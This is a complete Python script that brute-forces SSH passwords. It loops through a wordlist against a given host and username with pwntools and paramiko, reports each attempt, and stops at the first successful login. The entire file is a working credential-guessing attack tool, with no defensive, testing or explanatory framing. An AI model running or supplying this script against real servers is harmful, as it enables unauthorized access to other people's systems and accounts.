from pwn import *
import paramiko
import sys

def exploit(host, username, password_list):
	attempts = 0
	with open(password_list,'r') as pass_list:
		print("----STARTING TO HACKING--------")
		for password in pass_list:
			password = password.strip("\n")
			try:
				print("[{}] Attempting password: '{}'".format(attempts, password))
				res = ssh(host=host, user=username, password=password, timeout=1)
				if res.connected():
					print("[>] Valid password found: {}".format(password))
					res.close()
					break
				res.close()
			except paramiko.ssh_exception.AuthenticationException:
				print("[X] Invalid password")
			attempts += 1

if __name__ == '__main__':
	try:
		host = sys.argv[1].strip()
		username = sys.argv[2].strip()
		password_list = sys.argv[3].strip()
	except IndexError :
		print("[x]Error syntax!")
		print("[x]Missing paramaters!")
		print("[>]Usage: %s <ip> <username> <password list>" % sys.argv[0])
		exit(0)

	exploit(host, username, password_list)